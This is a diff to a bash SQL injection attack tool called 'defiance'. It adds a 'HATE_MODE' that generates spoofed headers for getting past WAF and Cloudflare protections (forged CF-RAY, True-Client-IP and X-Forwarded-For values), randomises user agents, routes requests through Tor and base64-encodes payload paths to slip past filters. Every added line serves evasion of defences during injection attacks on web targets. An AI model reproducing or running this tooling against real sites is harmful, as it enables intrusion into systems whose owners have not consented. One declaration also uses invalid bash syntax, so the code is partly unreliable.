@@ -59,6 +59,20 @@ print_defiance_logo() {
 braindamage() {
     local choice=$((RANDOM % 3))
     local cf_ray=$(cat /dev/urandom | tr -dc 'a-f0-9' | fold -w 16 | head -n 1)
+if [ "$HATE_MODE" = "true" ]; then
+        case "$choice" in
+            0)
+                echo "-H 'Content-Type: application/json' -H 'Authorization: Bearer $cf_ray' -H 'X-WAF-Bypass: True' -H 'CF-IPCountry: US'" 
+                ;;
+            1) 
+                echo "-H 'Content-Type: application/json' -H 'X-Requested-With: XMLHttpRequest' -H 'CF-RAY: ${cf_ray}-CGK' -H 'True-Client-IP: 103.21.244.$((RANDOM % 254 + 1))'" 
+                ;;
+            2)
+                echo "-H 'Content-Type: application/json' -H 'Cache-Control: no-cache, no-store' -H 'Pragma: no-cache' -H 'X-Forwarded-For: 127.0.0.1'" 
+                ;;
+        esac
+        return
+    fi
     if [[ "$target_url" != *"?"* ]]; then
         case "$choice" in
             0) echo "-H X-Forwarded-For:127.0.0.1 -H CF-Connecting-IP:172.67.$((RANDOM % 254 + 1)).$((RANDOM % 254 + 1)) -H CF-RAY:${cf_ray}-CGK" ;;
@@ -165,10 +179,16 @@ vector_sqli_agressor_right() {
 
         local random_port=${TOR_CIRCUITS[$RANDOM % ${#TOR_CIRCUITS[@]}]}
         if [ -n "$custom_proxy" ]; then local proxy_flag="-x $random_port --fail"; else local proxy_flag="--socks5-hostname 127.0.0.1:$random_port --socks5-gssapi-nec --fail"; fi
-        local random_ua=${DEFIANCE_UA[$RANDOM % ${#DEFIANCE_UA[@]}]}
+        local base_ua=${DEFIANCE_UA[$RANDOM % ${#DEFIANCE_UA[@]}]}
+        local random_ua=""
+if [ "$HATE_MODE" = "true" ]; then
+            local ua_salt=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 8 | head -n 1)
+            random_ua="${base_ua} Chrome/$((RANDOM % 10 + 120)).0.$((RANDOM % 999 + 1000)).$((RANDOM % 99)) Safari/537.36 Build/${ua_salt}"
+        else
+            random_ua="$base_ua"
+        fi
 local defiance_tamper_path = ""
 if [ "$HATE_MODE" = "true" ]; then
-            # BYPASS TAMPER: Peluru Base64 dalam file HAHA dikirim utuh tanpa modifikasi
             defiance_tamper_path=$(base64_engine "$default_path")
         else
         local t1=$(between_engine "$default_path")
